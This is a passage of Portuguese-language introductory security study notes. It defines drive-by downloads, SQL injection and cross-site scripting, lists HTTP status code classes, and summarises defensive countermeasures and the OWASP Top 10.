Os estágios comuns de um ataque típico da Web incluem a vítima, sem saber, visitar uma página da Web que foi comprometida por malware. A página Web comprometida redireciona o usuário para um site que hospeda códigos mal-intencionados. O navegador é feito para visitar este site e código malicioso infecta seu computador. Isso é conhecido como um drive-by download.

Independentemente do tipo de ataque, o objetivo principal é garantir que o navegador da vítima acabe na página web do ator da ameaça, que serve o exploit malicioso.

Códigos de Status HTTP:
1xx Informação
2xx Sucesso
3xx Redirecionamento
4xx Erro Cliente
5xx Erro Servidor
Contramedidas Web:
  • Manter SO e navegadores atualizados com patches
  • Usar proxy da Web para bloquear sites mal-intencionados
  • Seguir práticas OWASP no desenvolvimento web
  • Educar usuários finais sobre ataques baseados na Web

Aplicações Web e Bancos de Dados

Aplicativos Web geralmente se conectam a bancos de dados. Como esses bancos de dados podem conter informações confidenciais, eles são um alvo freqüente de ataques.

  • Injeção de código e SQL: Exploram campos de entrada insuficientemente validados para enviar comandos a bancos de dados.
  • Cross-Site Scripting (XSS): Ocorre quando navegadores executam scripts mal-intencionados no cliente.

O OWASP Top 10 Riscos de Segurança de Aplicativos Web foi projetado para ajudar as organizações a criar aplicativos Web seguros.

Mitigando Ataques de Rede Comuns (Recapitulação)

ACESSO

Senhas fortes, princípio da confiança mínima, criptografia, patches de SO e aplicativos.

DoS

Monitore utilização da rede. Muitos ataques DoS usam endereços falsificados.

RECONHECIMENTO

Autenticação, criptografia (anti-sniffer), infraestrutura comutada, firewall e IPS.

MALWARE

Antivírus + defesa no perímetro. Nenhuma solução é 100% eficaz.
